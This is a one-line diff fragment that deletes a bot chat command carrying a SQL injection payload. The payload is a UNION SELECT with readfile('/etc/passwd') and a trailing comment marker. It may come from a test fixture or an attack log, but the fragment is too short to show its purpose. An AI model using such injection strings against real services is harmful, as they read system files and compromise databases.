@@ -1,1 +1,0 @@
-@Bot porg zz' UNION SELECT 10, readfile('/etc/passwd'),30,'red','/srv/images/bill.webp';-- -
